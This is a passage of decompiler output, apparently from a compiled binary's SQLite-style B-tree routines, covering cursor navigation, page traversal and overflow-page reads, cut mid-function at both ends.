  if ( sub_1006166F(a1, v2) != v2 )
  {
    v10 = 0x40000000 / *(unsigned __int16 *)(a1 + 20) + 1;
    if ( v2 != v10 )
    {
      v9 = sub_10059C56((_BYTE *)(*(_DWORD *)(*(_DWORD *)(a1 + 12) + 64) + 36));
      v3 = *(unsigned __int16 *)(a1 + 22) / 5;
      v4 = v2 - (v9 + sub_1006166F(a1, v2) + v3 - v2) / v3 - v9;
      if ( v2 <= v10 || v4 >= v10 )
        goto LABEL_7;
      do
      {
        --v4;
LABEL_7:
        ;
      }
      while ( sub_1006166F(a1, v4) == v4 || v4 == v10 );
      if ( v2 >= v4 )
      {
        if ( v2 > v4 )
        {
          do
          {
            if ( v11 )
              break;
            v5 = sub_10062E31(a1, v4, v2--);
            v11 = v5;
          }
          while ( v2 > v4 );
          if ( v11 != 101 && v11 )
            goto LABEL_18;
        }
        if ( v9 )
        {
          v11 = sub_1006EFC8(*(_DWORD *)(*(_DWORD *)(a1 + 12) + 68));
          sub_10059C70((_BYTE *)(*(_DWORD *)(*(_DWORD *)(a1 + 12) + 64) + 32), 0);
          sub_10059C70((_BYTE *)(*(_DWORD *)(*(_DWORD *)(a1 + 12) + 64) + 36), v6);
          *(_DWORD *)(*(_DWORD *)a1 + 24) = v4;
        }
        if ( v11 )
LABEL_18:
          sub_1006F3D2(v8);
        return v11;
      }
    }
  }
  return 11;
}
// 10063115: variable 'v6' is possibly undefined

//----- (1006313A) --------------------------------------------------------
int __usercall sub_1006313A@<eax>(int a1@<eax>, char *a2)
{
  int v3; // esi
  int v4; // esi
  int v5; // ebx

  v3 = 0;
  if ( *(_BYTE *)(a1 + 8) == 2 )
  {
    v4 = *(_DWORD *)(a1 + 4);
    sub_10068C39(a1);
    if ( *(_BYTE *)(v4 + 18) )
    {
      v5 = sub_10063019(v4);
      if ( v5 )
      {
        sub_10068CA7(a1);
        return v5;
      }
    }
    v3 = sub_1006F1F2(*(_DWORD *)v4, a2, 0);
    sub_10068CA7(a1);
  }
  return v3;
}

//----- (1006318E) --------------------------------------------------------
void __usercall sub_1006318E(int a1@<eax>)
{
  int v2; // esi
  char v3; // al
  bool v4; // zf
  int v5; // eax
  int i; // eax

  v2 = *(_DWORD *)(a1 + 4);
  sub_10070E6B(*(_DWORD *)(v2 + 52));
  *(_DWORD *)(v2 + 52) = 0;
  v3 = *(_BYTE *)(a1 + 8);
  v4 = v3 == 0;
  if ( v3 )
  {
    if ( *(int *)(*(_DWORD *)a1 + 140) > 1 )
    {
      v5 = *(_DWORD *)(a1 + 4);
      if ( *(_DWORD *)(v5 + 68) == a1 )
      {
        *(_DWORD *)(v5 + 68) = 0;
        *(_BYTE *)(v5 + 72) = 0;
        *(_BYTE *)(v5 + 73) = 0;
        for ( i = *(_DWORD *)(v5 + 64); i; i = *(_DWORD *)(i + 12) )
          *(_BYTE *)(i + 8) = 1;
      }
      *(_BYTE *)(a1 + 8) = 1;
      return;
    }
    v4 = v3 == 0;
  }
  if ( !v4 )
  {
    sub_10061456(a1);
    v4 = (*(_DWORD *)(v2 + 36))-- == 1;
    if ( v4 )
      *(_BYTE *)(v2 + 32) = 0;
  }
  *(_BYTE *)(a1 + 8) = 0;
  sub_1006294A(v2);
}

//----- (100631FC) --------------------------------------------------------
int __usercall sub_100631FC@<eax>(int a1@<eax>)
{
  int v2; // ebx
  int v3; // eax
  int v4; // esi

  v2 = *(_DWORD *)(a1 + 4);
  sub_10068C39(a1);
  if ( *(_BYTE *)(a1 + 8) != 2 )
    goto LABEL_6;
  v3 = sub_1006F395(*(_DWORD *)v2);
  if ( !v3 )
  {
    *(_BYTE *)(v2 + 32) = 1;
LABEL_6:
    sub_1006318E(a1);
    v4 = 0;
    goto LABEL_4;
  }
  v4 = v3;
LABEL_4:
  sub_10068CA7(a1);
  return v4;
}

//----- (10063238) --------------------------------------------------------
int __usercall sub_10063238@<eax>(int a1@<eax>)
{
  int v2; // esi

  sub_10068C39(a1);
  v2 = sub_1006313A(a1, 0);
  if ( !v2 )
    v2 = sub_100631FC(a1);
  sub_10068CA7(a1);
  return v2;
}

//----- (10063268) --------------------------------------------------------
int __cdecl sub_10063268(int a1, int a2)
{
  int i; // esi
  int v3; // edi
  bool v4; // sf
  int *v5; // ebx

  sub_10068C39(a1);
  for ( i = *(_DWORD *)(*(_DWORD *)(a1 + 4) + 8); i; i = *(_DWORD *)(i + 8) )
  {
    sub_100615B9(i);
    v3 = 0;
    v4 = *(__int16 *)(i + 84) < 0;
    *(_BYTE *)(i + 67) = 3;
    *(_DWORD *)(i + 80) = a2;
    if ( !v4 )
    {
      v5 = (int *)(i + 88);
      do
      {
        sub_100620FB(*v5);
        *v5 = 0;
        ++v3;
        ++v5;
      }
      while ( v3 <= *(__int16 *)(i + 84) );
    }
  }
  return sub_10068CA7(a1);
}

//----- (100632C4) --------------------------------------------------------
int __usercall sub_100632C4@<eax>(int a1@<ebx>)
{
  int v1; // esi
  int v2; // eax
  int v3; // edi
  int v4; // eax
  int v6; // [esp+Ch] [ebp-4h] BYREF

  v1 = *(_DWORD *)(a1 + 4);
  sub_10068C39(a1);
  v2 = sub_10061587(v1, 0, 0);
  v3 = v2;
  if ( v2 )
    sub_10063268(a1, v2);
  if ( *(_BYTE *)(a1 + 8) == 2 )
  {
    v4 = sub_1006F3D2(*(_DWORD *)v1);
    if ( v4 )
      v3 = v4;
    if ( !sub_10062069((int *)v1, 1u, &v6, 0) )
      sub_100620FB(v6);
    *(_BYTE *)(v1 + 32) = 1;
  }
  sub_1006318E(a1);
  sub_10068CA7(a1);
  return v3;
}

//----- (10063337) --------------------------------------------------------
int __usercall sub_10063337@<eax>(int a1@<eax>, int a2)
{
  int v3; // esi
  int v4; // esi

  v3 = *(_DWORD *)(a1 + 4);
  sub_10068C39(a1);
  if ( *(_BYTE *)(a1 + 8) != 2 || *(_BYTE *)(v3 + 16) )
    v4 = 2;
  else
    v4 = sub_1006F459(*(_DWORD *)v3, a2);
  sub_10068CA7(a1);
  return v4;
}

//----- (10063373) --------------------------------------------------------
int __usercall sub_10063373@<eax>(int a1@<eax>, int a2, int a3)
{
  int v4; // esi
  int *v5; // ebx

  v4 = 0;
  if ( a1 && *(_BYTE *)(a1 + 8) == 2 )
  {
    v5 = *(int **)(a1 + 4);
    sub_10068C39(a1);
    v4 = sub_1006F519(*v5, a2, a3);
    if ( !v4 )
      v4 = sub_10062963((int)v5);
    sub_10068CA7(a1);
  }
  return v4;
}

//----- (100633BB) --------------------------------------------------------
int __usercall sub_100633BB@<eax>(int a1@<eax>, int a2@<ebx>, int a3, int a4, int a5)
{
  int v6; // edi
  int v7; // esi
  int v8; // eax
  int v10; // [esp-4h] [ebp-Ch]

  sub_10068C39(a2);
  v6 = *(_DWORD *)(a2 + 4);
  if ( a4 && *(_BYTE *)(v6 + 16) )
  {
    v10 = 8;
LABEL_4:
    v7 = v10;
    goto LABEL_11;
  }
  if ( a3 == 1 && !sub_100620A9((int *)v6) )
  {
    v10 = 16;
    goto LABEL_4;
  }
  *(_WORD *)(a1 + 84) = -1;
  *(_DWORD *)(a1 + 20) = a3;
  *(_DWORD *)(a1 + 16) = a5;
  *(_DWORD *)a1 = a2;
  *(_DWORD *)(a1 + 4) = v6;
  *(_BYTE *)(a1 + 64) = a4;
  v8 = *(_DWORD *)(v6 + 8);
  *(_DWORD *)(a1 + 8) = v8;
  if ( v8 )
    *(_DWORD *)(v8 + 12) = a1;
  *(_DWORD *)(v6 + 8) = a1;
  *(_DWORD *)(a1 + 24) = 0;
  *(_DWORD *)(a1 + 28) = 0;
  *(_BYTE *)(a1 + 67) = 0;
  v7 = 0;
LABEL_11:
  sub_10068CA7(a2);
  return v7;
}

//----- (10063439) --------------------------------------------------------
_DWORD *__cdecl sub_10063439(int a1, int a2)
{
  int v2; // ecx
  _DWORD *result; // eax

  result = *(_DWORD **)(v2 + 4);
  while ( 1 )
  {
    result = (_DWORD *)result[2];
    if ( !result )
      break;
    if ( result[5] == *(_DWORD *)(v2 + 20) )
    {
      result[6] = a1;
      result[7] = a2;
    }
  }
  return result;
}
// 1006343C: variable 'v2' is possibly undefined

//----- (1006345E) --------------------------------------------------------
int __usercall sub_1006345E@<eax>(int a1@<eax>)
{
  int v2; // ebx
  int v3; // eax
  int v4; // eax
  int *v5; // edi
  int v7; // [esp+10h] [ebp-8h]
  int v8; // [esp+14h] [ebp-4h]

  v7 = *(_DWORD *)a1;
  if ( *(_DWORD *)a1 )
  {
    v2 = *(_DWORD *)(a1 + 4);
    sub_10068C39(*(_DWORD *)a1);
    sub_100615B9(a1);
    v3 = *(_DWORD *)(a1 + 12);
    if ( v3 )
      *(_DWORD *)(v3 + 8) = *(_DWORD *)(a1 + 8);
    else
      *(_DWORD *)(v2 + 8) = *(_DWORD *)(a1 + 8);
    v4 = *(_DWORD *)(a1 + 8);
    if ( v4 )
      *(_DWORD *)(v4 + 12) = *(_DWORD *)(a1 + 12);
    v8 = 0;
    if ( *(__int16 *)(a1 + 84) >= 0 )
    {
      v5 = (int *)(a1 + 88);
      do
      {
        sub_100620FB(*v5);
        ++v8;
        ++v5;
      }
      while ( v8 <= *(__int16 *)(a1 + 84) );
    }
    sub_1006294A(v2);
    sub_10068CA7(v7);
  }
  return 0;
}

//----- (100634DB) --------------------------------------------------------
int __usercall sub_100634DB@<eax>(int a1@<esi>)
{
  int result; // eax

  if ( !*(_WORD *)(a1 + 62) )
  {
    result = sub_100618E4(
               *(_DWORD *)(a1 + 4 * *(__int16 *)(a1 + 84) + 88),
               *(unsigned __int16 *)(a1 + 2 * *(__int16 *)(a1 + 84) + 168),
               a1 + 32);
    *(_BYTE *)(a1 + 66) = 1;
  }
  return result;
}

//----- (10063501) --------------------------------------------------------
int __usercall sub_10063501@<eax>(int a1@<eax>, _DWORD *a2@<edi>)
{
  if ( *(_BYTE *)(a1 + 67) == 1 )
  {
    sub_100634DB(a1);
    *a2 = *(_DWORD *)(a1 + 40);
    a2[1] = *(_DWORD *)(a1 + 44);
  }
  else
  {
    *a2 = 0;
    a2[1] = 0;
  }
  return 0;
}

//----- (10063527) --------------------------------------------------------
int __usercall sub_10063527@<eax>(int a1@<eax>, unsigned int a2, _DWORD *a3, unsigned int *a4)
{
  unsigned int v5; // ebx
  int v6; // edi
  int v8; // [esp+Ch] [ebp-10h] BYREF
  unsigned int v9; // [esp+10h] [ebp-Ch]
  int v10; // [esp+14h] [ebp-8h] BYREF
  char v11; // [esp+1Bh] [ebp-1h] BYREF

  v9 = 0;
  v10 = 0;
  if ( !*(_BYTE *)(a1 + 18) )
    goto LABEL_11;
  v5 = a2;
  do
  {
    do
      ++v5;
    while ( sub_1006166F(a1, v5) == v5 );
  }
  while ( v5 == 0x40000000 / *(unsigned __int16 *)(a1 + 20) + 1 );
  if ( v5 > sub_100620A9((int *)a1) )
    goto LABEL_11;
  v6 = sub_1006175A(v5, (int *)a1, &v11, &v8);
  if ( !v6 )
  {
    if ( v11 == 4 && v8 == a2 )
    {
      v9 = v5;
      v6 = 101;
    }
    if ( !v6 )
    {
LABEL_11:
      v6 = sub_10062069((int *)a1, a2, &v10, 0);
      if ( !v6 )
        v9 = sub_10059C56(*(_BYTE **)(v10 + 64));
    }
  }
  *a4 = v9;
  if ( a3 )
    *a3 = v10;
  else
    sub_100620FB(v10);
  return v6 != 101 ? v6 : 0;
}
// 10063527: using guessed type int var_8;

//----- (100635F1) --------------------------------------------------------
int __usercall sub_100635F1@<eax>(unsigned int a1@<eax>, int a2@<ecx>, size_t a3, char *a4)
{
  unsigned int v6; // ecx
  int v7; // ebx
  size_t v8; // edx
  unsigned int v9; // eax
  size_t v10; // edi
  size_t v11; // esi
  int v12; // eax
  int v13; // ebx
  unsigned int v15; // [esp+Ch] [ebp-14h] BYREF
  size_t Size; // [esp+10h] [ebp-10h]
  int v17; // [esp+14h] [ebp-Ch]
  int v18; // [esp+18h] [ebp-8h] BYREF
  int v19; // [esp+1Ch] [ebp-4h]

  v19 = 0;
  v15 = *(_DWORD *)(a2 + 4 * *(__int16 *)(a2 + 84) + 88);
  v17 = *(_DWORD *)(a2 + 4);
  sub_100634DB(a2);
  v6 = v15;
  v7 = *(_DWORD *)(a2 + 32) + *(unsigned __int16 *)(a2 + 56);
  if ( *(_BYTE *)(v15 + 2) )
    Size = 0;
  else
    Size = *(_DWORD *)(a2 + 40);
  v8 = Size + *(_DWORD *)(a2 + 48);
  v15 = a1 + a3;
  if ( a1 + a3 > v8 )
    return 11;
  v9 = *(unsigned __int16 *)(a2 + 58);
  if ( v9 + v7 > *(_DWORD *)(v6 + 64) + (unsigned int)*(unsigned __int16 *)(v17 + 22) )
    return 11;
  if ( a1 >= v9 )
  {
    v10 = a1 - v9;
  }
  else
  {
    Size = a3;
    if ( v15 > v9 )
      Size = v9 - a1;
    memcpy(a4, (const void *)(v7 + a1), Size);
    a4 += Size;
    v10 = 0;
    a3 -= Size;
    v19 = 0;
  }
  if ( !a3 )
    return v19;
  Size = *(unsigned __int16 *)(v17 + 22) - 4;
  v18 = sub_10059C56((_BYTE *)(v7 + *(unsigned __int16 *)(a2 + 58)));
  do
  {
    v11 = a3;
    if ( !a3 || !v18 )
      break;
    if ( v10 < Size )
    {
      v19 = sub_1006EB74(*(_DWORD *)v17, v18, &v15, 0);
      if ( v19 )
        return v19;
      v13 = *(_DWORD *)v15;
      v18 = sub_10059C56(*(_BYTE **)v15);
      if ( v10 + a3 > Size )
        v11 = Size - v10;
      memcpy(a4, (const void *)(v13 + v10 + 4), v11);
      v10 = 0;
      v19 = 0;
      sub_1006EC75(v15);
      a3 -= v11;
      a4 += v11;
    }
    else
    {
      v12 = sub_10063527(v17, v18, 0, (unsigned int *)&v18);
      v10 -= Size;
      v19 = v12;
    }
  }
  while ( !v19 );
  if ( !v19 && a3 )
    return 11;
  else
    return v19;
}

//----- (10063776) --------------------------------------------------------
int __usercall sub_10063776@<eax>(int a1@<eax>, int a2, size_t a3, char *a4)
{
  int result; // eax

  if ( *(_BYTE *)(a1 + 67) < 2u )
    result = 0;
  else
    result = sub_10061630(a1);
  if ( !result )
    return sub_100635F1(a2, a1, a3, a4);
  return result;
}

//----- (100637A4) --------------------------------------------------------
int __usercall sub_100637A4@<eax>(int a1@<esi>, _DWORD *a2, int a3)
{
  int v3; // edi
  int result; // eax
  int v5; // edx
  int v6; // ecx

  v3 = *(_DWORD *)(a1 + 4 * *(__int16 *)(a1 + 84) + 88);
  if ( !*(_WORD *)(a1 + 62) )
    sub_100618E4(
      *(_DWORD *)(a1 + 4 * *(__int16 *)(a1 + 84) + 88),
      *(unsigned __int16 *)(a1 + 2 * *(__int16 *)(a1 + 84) + 168),
      a1 + 32);
  result = *(_DWORD *)(a1 + 32) + *(unsigned __int16 *)(a1 + 56);
  if ( *(_BYTE *)(v3 + 2) )
    v5 = 0;
  else
    v5 = *(_DWORD *)(a1 + 40);
  v6 = *(unsigned __int16 *)(a1 + 58);
  if ( a3 )
  {
    result += v5;
    v6 -= v5;
  }
  *a2 = v6;
  return result;
}

//----- (100637FB) --------------------------------------------------------
int __usercall sub_100637FB@<eax>(int a1@<esi>, unsigned int a2)
{
  __int16 v2; // cx
  int v3; // edi
  int result; // eax
  int v5; // eax
  int v6; // [esp+8h] [ebp-4h] BYREF

  v2 = *(_WORD *)(a1 + 84);
  v3 = v2;
  if ( v2 >= 19 )
    return 11;
  result = sub_100620C4(*(int **)(a1 + 4), &v6, a2);
  if ( result )
    return result;
  v5 = v6;
  *(_DWORD *)(a1 + 4 * v3 + 92) = v6;
  *(_WORD *)(a1 + 2 * v3 + 170) = 0;
  ++*(_WORD *)(a1 + 84);
  *(_WORD *)(a1 + 62) = 0;
  *(_BYTE *)(a1 + 66) = 0;
  if ( *(_WORD *)(v5 + 16) && *(_BYTE *)(v5 + 2) == *(_BYTE *)(*(_DWORD *)(a1 + 4 * v3 + 88) + 2) )
    return 0;
  else
    return 11;
}

//----- (1006385B) --------------------------------------------------------
void __usercall sub_1006385B(int a1@<esi>)
{
  sub_100620FB(*(_DWORD *)(a1 + 4 * *(__int16 *)(a1 + 84) + 88));
  --*(_WORD *)(a1 + 84);
  *(_WORD *)(a1 + 62) = 0;
  *(_BYTE *)(a1 + 66) = 0;
}

//----- (10063878) --------------------------------------------------------
int __usercall sub_10063878@<eax>(int a1@<eax>)
{
  int *v2; // edi
  unsigned __int8 v3; // al
  int result; // eax
  __int16 v5; // ax
  int v6; // edi
  int *v7; // ebx
  int v8; // eax
  __int16 v9; // cx
  bool v10; // zf
  int v11; // eax
  int v12; // [esp+Ch] [ebp-4h]

  v12 = 0;
  v2 = *(int **)(*(_DWORD *)a1 + 4);
  v3 = *(_BYTE *)(a1 + 67);
  if ( v3 >= 2u )
  {
    if ( v3 == 3 )
      return *(_DWORD *)(a1 + 80);
    sub_100615B9(a1);
  }
  v5 = *(_WORD *)(a1 + 84);
  if ( v5 < 0 )
  {
    result = sub_100620C4(v2, (int *)(a1 + 88), *(_DWORD *)(a1 + 20));
    v12 = result;
    if ( result )
    {
      *(_BYTE *)(a1 + 67) = 0;
      return result;
    }
    v10 = *(_DWORD *)(a1 + 16) == 0;
    *(_WORD *)(a1 + 84) = 0;
    if ( v10 != *(_BYTE *)(*(_DWORD *)(a1 + 88) + 2) )
      return 11;
  }
  else
  {
    v6 = 1;
    if ( v5 >= 1 )
    {
      v7 = (int *)(a1 + 92);
      do
      {
        sub_100620FB(*v7);
        ++v6;
        ++v7;
      }
      while ( v6 <= *(__int16 *)(a1 + 84) );
    }
    *(_WORD *)(a1 + 84) = 0;
  }
  v8 = *(_DWORD *)(a1 + 88);
  *(_WORD *)(a1 + 168) = 0;
  *(_WORD *)(a1 + 62) = 0;
  *(_BYTE *)(a1 + 65) = 0;
  *(_BYTE *)(a1 + 66) = 0;
  v9 = *(_WORD *)(v8 + 16);
  v10 = v9 == 0;
  if ( v9 )
  {
LABEL_19:
    *(_BYTE *)(a1 + 67) = !v10;
    return v12;
  }
  if ( *(_BYTE *)(v8 + 3) )
  {
    v10 = 1;
    goto LABEL_19;
  }
  if ( *(_DWORD *)(v8 + 72) != 1 )
    return 11;
  v11 = sub_10059C56((_BYTE *)(*(unsigned __int8 *)(v8 + 5) + *(_DWORD *)(v8 + 64) + 8));
  *(_BYTE *)(a1 + 67) = 1;
  return sub_100637FB(a1, v11);
}

//----- (10063962) --------------------------------------------------------
int __usercall sub_10063962@<eax>(int a1@<eax>)
{
  int result; // eax
  int v3; // ecx
  int v4; // edi
  _BYTE *v5; // eax
  __int16 v6; // dx
  int v7; // eax

  result = 0;
  do
  {
    v3 = *(_DWORD *)(a1 + 4 * *(__int16 *)(a1 + 84) + 88);
    if ( *(_BYTE *)(v3 + 3) )
      break;
    v4 = *(_DWORD *)(v3 + 64);
    v5 = (_BYTE *)(v4 + *(unsigned __int16 *)(v3 + 12) + 2 * *(unsigned __int16 *)(a1 + 2 * *(__int16 *)(a1 + 84) + 168));
    LOBYTE(v6) = v5[1];
    HIBYTE(v6) = *v5;
    v7 = sub_10059C56((_BYTE *)(v4 + (unsigned __int16)(*(_WORD *)(v3 + 18) & v6)));
    result = sub_100637FB(a1, v7);
  }
  while ( !result );
  return result;
}

//----- (100639B3) --------------------------------------------------------
int __usercall sub_100639B3@<eax>(int a1@<eax>)
{
  int result; // eax
  int v3; // ebx
  int v4; // edi
  int v5; // eax

  result = 0;
  do
  {
    v3 = *(__int16 *)(a1 + 84);
    v4 = *(_DWORD *)(a1 + 4 * v3 + 88);
    if ( *(_BYTE *)(v4 + 3) )
      break;
    v5 = sub_10059C56((_BYTE *)(*(unsigned __int8 *)(v4 + 5) + *(_DWORD *)(v4 + 64) + 8));
    *(_WORD *)(a1 + 2 * v3 + 168) = *(_WORD *)(v4 + 16);
    result = sub_100637FB(a1, v5);
  }
  while ( !result );
  if ( !result )
  {
    *(_WORD *)(a1 + 2 * *(__int16 *)(a1 + 84) + 168) = *(_WORD *)(v4 + 16) - 1;
    *(_WORD *)(a1 + 62) = 0;
    *(_BYTE *)(a1 + 66) = 0;
  }
  return result;
}

//----- (10063A10) --------------------------------------------------------
int __usercall sub_10063A10@<eax>(int a1@<edi>, _DWORD *a2@<esi>)
{
  int result; // eax

  result = sub_10063878(a1);
  if ( !result )
  {
    if ( *(_BYTE *)(a1 + 67) )
    {
      *a2 = 0;
      return sub_10063962(a1);
    }
    else
    {
      *a2 = 1;
    }
  }
  return result;
}

//----- (10063A35) --------------------------------------------------------
int __usercall sub_10063A35@<eax>(_DWORD *a1@<edi>, int a2@<esi>)
{
  int result; // eax

  if ( *(_BYTE *)(a2 + 67) == 1 && *(_BYTE *)(a2 + 65) )
    return 0;
  result = sub_10063878(a2);
  if ( !result )
  {
    if ( *(_BYTE *)(a2 + 67) )
    {
      *a1 = 0;
      result = sub_100639B3(a2);
      *(_BYTE *)(a2 + 65) = result == 0;
    }
    else
    {
      *a1 = 1;
    }
  }
  return result;
}

//----- (10063A72) --------------------------------------------------------
int __cdecl sub_10063A72(int a1, int a2, __int64 a3, int a4, int *a5)
{
  int v5; // ebx
  unsigned int v6; // ecx
  unsigned int v7; // eax
  int result; // eax
  int v9; // ecx
  _BYTE *v10; // edi
  int v11; // esi
  int v12; // esi
  int i; // eax
  int v14; // eax
  int v15; // ecx
  int v16; // edx
  _BYTE *v17; // eax
  unsigned __int8 *v18; // edx
  bool v19; // zf
  unsigned __int8 *v20; // eax
  unsigned __int8 v21; // cl
  char v22; // al
  unsigned int v23; // eax
  int v24; // ecx
  bool v25; // cc
  int v26; // ecx
  unsigned __int8 *v27; // eax
  char v28; // dl
  size_t v29; // esi
  char *v30; // eax
  unsigned __int8 *v31; // ebx
  int v32; // edi
  int v33; // eax
  _BYTE *v34; // eax
  int v35; // esi
  _BYTE *v36; // eax
  __int16 v37; // cx
  int v38; // eax
  unsigned int v39; // [esp+10h] [ebp-20h] BYREF
  int v40; // [esp+14h] [ebp-1Ch]
  int v41; // [esp+18h] [ebp-18h] BYREF
  int v42; // [esp+1Ch] [ebp-14h]
  _BYTE *v43; // [esp+20h] [ebp-10h]
  int v44; // [esp+24h] [ebp-Ch]
  int v45; // [esp+28h] [ebp-8h]
  int v46; // [esp+2Ch] [ebp-4h]

  v5 = a1;
  if ( *(_BYTE *)(a1 + 67) == 1 && *(_BYTE *)(a1 + 66) && *(_BYTE *)(*(_DWORD *)(a1 + 88) + 2) )
  {
    v6 = *(_DWORD *)(a1 + 40);
    v7 = *(_DWORD *)(a1 + 44);
    if ( __PAIR64__(v7, v6) == a3 )
    {
      *a5 = 0;
      return 0;
    }
    if ( *(_BYTE *)(a1 + 65) && __SPAIR64__(v7, v6) < a3 )
      goto LABEL_9;
  }
  result = sub_10063878(a1);
  if ( result )
    return result;
  if ( !*(_BYTE *)(a1 + 67) )
  {
LABEL_9:
    *a5 = -1;
    return 0;
  }
  while ( 2 )
  {
    v9 = *(__int16 *)(v5 + 84);
    v10 = *(_BYTE **)(v5 + 4 * v9 + 88);
    v11 = *((unsigned __int16 *)v10 + 8);
    v45 = 0;
    v12 = v11 - 1;
    v43 = v10;
    v44 = v12;
    if ( a4 )
    {
      *(_WORD *)(v5 + 2 * v9 + 168) = v12;
      goto LABEL_16;
    }
    for ( i = v12; ; i = v12 + v45 )
    {
      *(_WORD *)(v5 + 2 * v9 + 168) = i / 2;
LABEL_16:
      v14 = *(unsigned __int16 *)(v5 + 2 * *(__int16 *)(v5 + 84) + 168);
      *(_WORD *)(v5 + 62) = 0;
      v15 = *((_DWORD *)v10 + 16);
      v16 = v15 + *((unsigned __int16 *)v10 + 6);
      v42 = v14;
      v17 = (_BYTE *)(v16 + 2 * v14);
      LOBYTE(v16) = v17[1];
      BYTE1(v16) = *v17;
      v18 = (unsigned __int8 *)(v15 + (unsigned __int8)v10[6] + (unsigned __int16)(*((_WORD *)v10 + 9) & v16));
      v19 = v10[2] == 0;
      v41 = (unsigned __int8)v10[6];
      v20 = v18;
      v46 = (int)v18;
      if ( v19 )
      {
        v26 = *v18;
        if ( (v26 & 0x80u) != 0 || v26 > *((unsigned __int16 *)v10 + 4) )
        {
          v28 = v18[1];
          if ( v28 < 0 || (v26 = (unsigned __int8)v28 + ((v26 & 0x7F) << 7), v26 > *((unsigned __int16 *)v10 + 4)) )
          {
            sub_100617C9(v5 + 32, v43, v46 - v41);
            v29 = *(_DWORD *)(a1 + 40);
            v30 = (char *)sub_10058C4C(v29);
            v31 = (unsigned __int8 *)v30;
            if ( !v30 )
              return 7;
            v32 = sub_100635F1(0, a1, v29, v30);
            if ( v32 )
            {
              sub_10058E74((int)v31);
              return v32;
            }
            v46 = sub_1005C34E(v29, v31, a2);
            sub_10058E74((int)v31);
            v5 = a1;
            v10 = v43;
            goto LABEL_42;
          }
          v27 = v20 + 2;
        }
        else
        {
          v27 = v18 + 1;
        }
        v46 = sub_1005C34E(v26, v27, a2);
        goto LABEL_43;
      }
      if ( v10[4] )
      {
        if ( *v18 >= 0x80u )
        {
          v22 = sub_10059BD0((unsigned __int8 *)v46, &v41);
          v10 = v43;
          v21 = v22;
          v20 = (unsigned __int8 *)v46;
        }
        else
        {
          v21 = 1;
        }
        v20 += v21;
      }
      sub_10059A38(v20, &v39);
      v23 = v39;
      v24 = v40;
      if ( v39 != (_DWORD)a3 )
      {
        v25 = v40 <= SHIDWORD(a3);
LABEL_26:
        if ( v25 && (v25 || v39 < (unsigned int)a3) )
          v46 = -1;
        else
          v46 = 1;
        goto LABEL_31;
      }
      v25 = v40 <= SHIDWORD(a3);
      if ( v40 != HIDWORD(a3) )
        goto LABEL_26;
      v46 = 0;
LABEL_31:
      *(_BYTE *)(v5 + 66) = 1;
      *(_DWORD *)(v5 + 40) = v23;
      *(_DWORD *)(v5 + 44) = v24;
LABEL_42:
      v12 = v44;
LABEL_43:
      if ( !v46 )
        break;
      if ( v46 >= 0 )
      {
        v44 = v42 - 1;
        v12 = v42 - 1;
      }
      else
      {
        v45 = v42 + 1;
      }
      v33 = v45;
      if ( v45 > v12 )
        goto LABEL_52;
      v9 = *(__int16 *)(v5 + 84);
    }
    if ( !v10[2] || v10[3] )
    {
      *a5 = 0;
      return 0;
    }
    v33 = v42;
    v45 = v42;
LABEL_52:
    if ( v10[3]
      || (v33 < *((unsigned __int16 *)v10 + 8)
        ? (v35 = *((_DWORD *)v10 + 16),
           v36 = (_BYTE *)(v35 + *((unsigned __int16 *)v10 + 6) + 2 * v33),
           LOBYTE(v37) = v36[1],
           HIBYTE(v37) = *v36,
           v34 = (_BYTE *)(v35 + (unsigned __int16)(*((_WORD *)v10 + 9) & v37)))
        : (v34 = (_BYTE *)((unsigned __int8)v10[5] + *((_DWORD *)v10 + 16) + 8)),
          (v38 = sub_10059C56(v34)) == 0) )
    {
      *a5 = v46;
      return 0;
    }
    *(_WORD *)(v5 + 2 * *(__int16 *)(v5 + 84) + 168) = v45;
    *(_WORD *)(v5 + 62) = 0;
    *(_BYTE *)(v5 + 66) = 0;
    v32 = sub_100637FB(v5, v38);
    if ( !v32 )
      continue;
    return v32;
  }
}

//----- (10063D40) --------------------------------------------------------
int __cdecl sub_10063D40(int a1, _DWORD *a2)
{
  int result; // eax
  bool v3; // cc
  int v4; // ecx
  int v5; // eax
  __int16 v6; // cx
  int v7; // edx
  int v8; // eax
  int v9; // edx

  if ( *(_BYTE *)(a1 + 67) < 2u )
    result = 0;
  else
    result = sub_10061630(a1);
  if ( !result )
  {
    if ( !*(_BYTE *)(a1 + 67) )
    {
      *a2 = 1;
      return 0;
    }
    v3 = *(_DWORD *)(a1 + 80) <= 0;
    *(_DWORD *)(a1 + 80) = 0;
    if ( !v3 )
    {
      result = 0;
LABEL_10:
      *a2 = 0;
      return result;
    }
    v4 = *(__int16 *)(a1 + 84);
    v5 = *(_DWORD *)(a1 + 4 * v4 + 88);
    ++*(_WORD *)(a1 + 2 * v4 + 168);
    v6 = *(_WORD *)(a1 + 84);
    v7 = *(unsigned __int16 *)(a1 + 2 * v6 + 168);
    *(_WORD *)(a1 + 62) = 0;
    *(_BYTE *)(a1 + 66) = 0;
    if ( v7 < *(unsigned __int16 *)(v5 + 16) )
    {
      *a2 = 0;
      if ( *(_BYTE *)(v5 + 3) )
        return 0;
      return sub_10063962(a1);
    }
    else if ( *(_BYTE *)(v5 + 3) )
    {
      do
      {
        if ( !v6 )
        {
          *a2 = 1;
          *(_BYTE *)(a1 + 67) = 0;
          return 0;
        }
        sub_1006385B(a1);
        v6 = *(_WORD *)(a1 + 84);
        v9 = *(_DWORD *)(a1 + 4 * v6 + 88);
      }
      while ( *(_WORD *)(a1 + 2 * v6 + 168) >= *(_WORD *)(v9 + 16) );
      *a2 = 0;
      if ( !*(_BYTE *)(v9 + 2) )
        return 0;
      return sub_10063D40(a1, a2);
    }
    else
    {
      v8 = sub_10059C56((_BYTE *)(*(unsigned __int8 *)(v5 + 5) + *(_DWORD *)(v5 + 64) + 8));
      result = sub_100637FB(a1, v8);
      if ( !result )
      {
        result = sub_10063962(a1);
        goto LABEL_10;
      }
    }
  }
  return result;
}

//----- (10063E4D) --------------------------------------------------------
int __cdecl sub_10063E4D(int a1, _DWORD *a2)
{
  int result; // eax
  bool v3; // zf
  bool v4; // sf
  int v5; // ecx
  int v6; // eax
  int v7; // edi
  _BYTE *v8; // ecx
  __int16 v9; // dx
  int v10; // eax
  _WORD *v11; // eax
  int v12; // eax

  if ( *(_BYTE *)(a1 + 67) < 2u )
    result = 0;
  else
    result = sub_10061630(a1);
  if ( !result )
  {
    v3 = *(_BYTE *)(a1 + 67) == 0;
    *(_BYTE *)(a1 + 65) = 0;
    if ( v3 )
    {
LABEL_6:
      *a2 = 1;
      return 0;
    }
    v4 = *(int *)(a1 + 80) < 0;
